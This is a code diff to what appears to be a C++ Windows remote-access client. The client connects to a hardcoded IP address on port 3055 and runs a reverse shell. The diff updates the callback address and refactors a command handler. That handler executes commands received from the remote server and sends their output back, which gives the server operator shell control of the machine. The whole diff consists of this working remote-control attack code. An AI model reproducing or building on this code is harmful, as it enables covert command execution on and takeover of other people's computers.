@@ -13,7 +13,7 @@
 #include "information/network/NetworkInformation.h"
 #include "reverse_shell/ReverseShell.h"
 
-#define IP "192.168.1.133"
+#define IP "192.168.82.182"
 
 #define PORT 3055
 
@@ -69,6 +69,7 @@ int main() {
             if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                 std::cout << "Connected to server!" << std::endl;
                 Stream stream(sock);
+                ReverseShell reverseShell;
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
@@ -158,15 +159,13 @@ int main() {
                             break;
                         }
                         case 11: {
-                            std::cout << "REVERSE SHELL " << std::endl;
+                            std::cout << "OPEN REVERSE SHELL " << std::endl;
                             std::string command = stream.readString();
-                            std::string response = ReverseShell::executeCommand(L"cd");
+                            std::string response  = reverseShell.executeCommand(L"cd");
                             response.erase(std::remove(response.begin(), response.end(), '\n'), response.cend());
                             response.append("|");
-                            response.append(ReverseShell::executeCommand(Converter::string2wstring(command)));
+                            response.append(reverseShell.executeCommand(Converter::string2wstring(command)));
                             stream.sendString(response.c_str());
-
-                            //stream.sendString(response.c_str());
                             break;
                         }
                         case 16: {
